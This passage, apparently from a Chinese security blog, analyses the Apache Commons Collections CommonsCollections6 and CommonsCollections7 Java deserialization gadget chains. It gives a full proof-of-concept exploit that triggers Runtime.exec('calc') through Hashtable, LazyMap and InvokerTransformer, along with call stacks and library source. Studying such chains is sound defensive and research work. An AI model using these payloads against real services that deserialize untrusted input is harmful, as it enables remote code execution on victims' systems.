class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(triggerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">...</span><br><span class="line">main:34, CommonsCollections6 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是 <code>HashMap</code> 的 <code>put</code> 方法同样对 <code>key</code> 调用 <code>hash</code> 方法，进而调用 <code>key</code> 的 <code>hashCode</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此在 poc 中当我们 <code>triggerMap.put(entry, &quot;123&quot;)</code> 时会调用 <code>TiedMapEntry.hashCode</code> 从而调用 <code>LazyMap.get</code>，使得 <code>TiedMapEntry.key</code> 已经放到 <code>TiedMapEntry.map</code> 中了，因此会导致后续反序列化无法虽然调用到 <code>LazyMap.get</code>，但是调用不到 <code>transform</code> 方法。解决方法是调用 <code>LazyMap.clear</code> 清空 <code>LazyMap</code> 。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections7（Hashtable→LazyMap）"><a href="#CommonsCollections7（Hashtable→LazyMap）" class="headerlink" title="CommonsCollections7（Hashtable→LazyMap）"></a>CommonsCollections7（Hashtable→LazyMap）</h3><p><code>Hashtable</code> 的 <code>readObject</code> 调用 <code>reconstitutionPut</code> 函数将反序列化出的键值对存储到哈希表 <code>table</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reconstitutionPut</code> 函数先对传入的 <code>key</code> 调用 <code>hashCode</code> 方法得到哈希值，然后计算出哈希值对应哈希表的下标 <code>index</code>。在哈希表 <code>tab</code> 中遍历 <code>index</code> 对应的那一项中的每一个元素 <code>e</code>，然后判断该元素的哈希值与当前要添加的那一项的哈希值是否相等。如果哈希值相等则调用 <code>e.key.equals</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; <span class="comment">// 如果哈希值相等则对哈希表中的 key 调用 equals 方法。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于 <code>HashMap</code> 和 <code>LazyMap</code> 有如下继承关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/image-20241108030406773-1735752042713-2.png"
                      alt="image-20241108030406773"
                ><br>可以看到，<code>HashMap</code> 继承于 <code>AbstraceMap</code>，<code>LazyMap</code> 继承于 <code>AbstractMapDecorator</code>。</p>
<p>因此如果 <code>HashTable</code> 中的 <code>key</code> 都是 <code>LazyMap</code> 修饰的 <code>HashMap</code> 那么 <code>e.key.equals</code> 最终会调用 <code>LazyMap#get</code> 进而触发 <code>transform</code> 方法调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstraceMap</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (o == <span class="built_in">this</span>) <span class="comment">// 确保不是同一个 LazyMap 对象</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">       <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">           <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">               Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">               <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key))) <span class="comment">// 调用 LazyMap#get</span></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.equals(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>根据前面的分析可知我们可以在 <code>Hashtable</code> 放两个键值对满足两个键哈希值相同但不是同一个的 <code>LazyMap</code> 对像。而 <code>LazyMap</code> 的哈希值实际上就是 <code>Map</code> 中所有「键和值的哈希的异或值」之和。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="literal">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// HashMap$Node (Map.Entry)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstraceMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">            h += i.next().hashCode();</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstractMapDecorator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">key.hashCode();</span><br></pre></td></tr></table></figure></div>

<p>我们不妨让键值对中的值相等，那么就只需要考虑找哈希相等且值不同的键。</p>
<p>我们选择 <code>java.lang.String</code> 类型的键，这个类型的 <code>hashCode</code> 实现如下，我们很容易就想到可以构造长度为 2 的字符串，然后通过前一个字符的 ascii 码加 1 然后后一个字符的 ascii 码减 31 抵消前一个字符的影响来得到两个哈希相同的字符串（例如 <code>Aa</code>→<code>[65,97]</code>→<code>[65+1,97-31]</code>→<code>[66,66]</code>→<code>BB</code>）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>完整 poc 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">equals:472, AbstractMap (java.util)</span><br><span class="line">equals:130, AbstractMapDecorator (org.apache.commons.collections.map)</span><br><span class="line">reconstitutionPut:1221, Hashtable (java.util)</span><br><span class="line">readObject:1195, Hashtable (java.util)</span><br><span class="line">...</span><br><span class="line">main:49, CommonsCollections7 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>Hashtable#put</code> 也会调用 <code>entry.key.equals</code> 方法导致利用链被触发一次，因此需要将调用 <code>LazyMap#get</code> 时加入的 <code>key</code> 去掉。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>Hashtable#put</code> 调用的 <code>entry.key.equals</code> 需要返回 <code>false</code> 才能把第二个键值对放入 <code>Hashtable</code>。在 <code>AbstraceMap#equals</code> 中，如果 <code>value</code> 为 <code>null</code> 的话只需要让 <code>m.get(key)</code> 返回不为 <code>null</code> 即可。而 <code>transformer</code> 方法返回不为 <code>null</code> 很容易满足。</p>
